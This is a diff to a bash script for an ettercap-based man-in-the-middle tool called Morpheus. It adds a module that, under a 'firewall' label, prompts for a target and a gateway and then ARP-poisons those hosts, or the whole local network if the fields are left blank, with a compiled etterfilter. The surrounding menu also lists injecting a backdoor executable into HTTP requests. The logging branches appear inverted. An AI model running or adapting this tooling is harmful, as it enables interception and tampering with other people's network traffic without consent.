@@ -235,6 +235,73 @@ fi
 
 
 
+sh_stage10 () {
+cat << !
+---
+-- This module acts like a firewall reporting/blocking tcp/udp connection
+-- made by ip addr inside local lan (manual) and auto compile/lunch filter.
+---
+!
+sleep 2
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS ☠" --text "Execute this module?" --width 330) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+# get user input to build filter
+echo ${BlueF}[☠]${white} Enter filter settings! ${Reset};
+rhost=$(zenity --title="☠ Enter RHOST ☠" --text "example: $IP\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
+
+  echo ${BlueF}[☠]${white} Backup files needed...${Reset};
+  cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.bk > /dev/null 2>&1
+  sleep 1
+  echo ${BlueF}[☠]${white} Edit firewall.eft '(filter)'...${Reset};  
+  xterm -T "MORPHEUS - firewall filter" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
+  sleep 1
+
+    # compiling firewall.eft to be used in ettercap
+    echo ${BlueF}[☠]${white} Compiling firewall.eft...${Reset};
+    xterm -T "MORPHEUS - compiling" -geometry 100x30 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
+    sleep 1
+
+      # run mitm+filter
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter...${Reset};
+      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework...${Reset};   
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        if [ "$LoGs" = "NO" ]; then
+        echo ${GreenF}[☠]${white} Using IPv6 settings...${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost// /$gateway//
+        else
+        echo ${GreenF}[☠]${white} Using IPv6 settings...${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost// /$gateway//
+        fi
+
+      else
+
+        if [ "$LoGs" = "YES" ]; then
+        echo ${GreenF}[☠]${white} Using IPv4 settings...${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost/ /$gateway/
+        else
+        echo ${GreenF}[☠]${white} Using IPv4 settings...${Reset};
+        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost/ /$gateway/
+        fi
+      fi
+    
+
+  # clean up
+  echo ${BlueF}[☠]${white} Cleaning recent files...${Reset};
+  mv $IPATH/filters/firewall.bk $IPATH/filters/firewall.eft > /dev/null 2>&1
+  sleep 1
+
+else
+  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
+  sleep 2
+fi
+}
+
+
+
 sh_FAQ () {
 echo ""
 echo "[☠] stage 2 running..."
@@ -278,6 +345,7 @@ cat << !
     |   7    -  Rotate website document 180 degrees (CSS3 injection)    |
     |   8    -  Inject backdoor into html request (executable.exe)      |
     |   9    -  Write your own filter and use morpheus to inject it     |
+    |  10    -  firewall.eft report/block tcp/udp connections (manual)  |
     |                                                                   |
     |   E    -  exit/close Morpheus tool                                |
     +-------------------------------------------------------------------+
@@ -292,6 +360,7 @@ read choice
 case $choice in
 1) sh_stage1 ;;
 9) sh_stage9 ;;
+10) sh_stage10 ;;
 e) sh_exit ;;
 E) sh_exit ;;
 *) echo "\"$choice\": is not a valid Option"; sleep 2 ;;
